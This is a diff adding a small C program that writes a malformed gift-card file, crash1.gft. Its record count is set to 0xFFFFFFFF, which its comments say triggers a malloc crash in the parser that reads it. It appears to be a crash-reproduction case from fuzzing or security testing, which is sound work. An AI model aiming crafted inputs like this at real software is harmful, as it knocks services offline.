@@ -1,0 +1,20 @@
+// crash1gen.c
+#include <stdio.h>
+#include <stdint.h>
+
+int main() {
+    FILE *f = fopen("crash1.gft", "wb");
+
+    uint32_t num_bytes = 100;
+    char merchant_id[32] = "CrashMerchant                    ";
+    char customer_id[32] = "CrashCustomer                    ";
+    uint32_t num_records = 0xFFFFFFFF; // absurdly large
+
+    fwrite(&num_bytes, 4, 1, f);
+    fwrite(merchant_id, 32, 1, f);
+    fwrite(customer_id, 32, 1, f);
+    fwrite(&num_records, 4, 1, f); // triggers malloc crash
+
+    fclose(f);
+    return 0;
+}
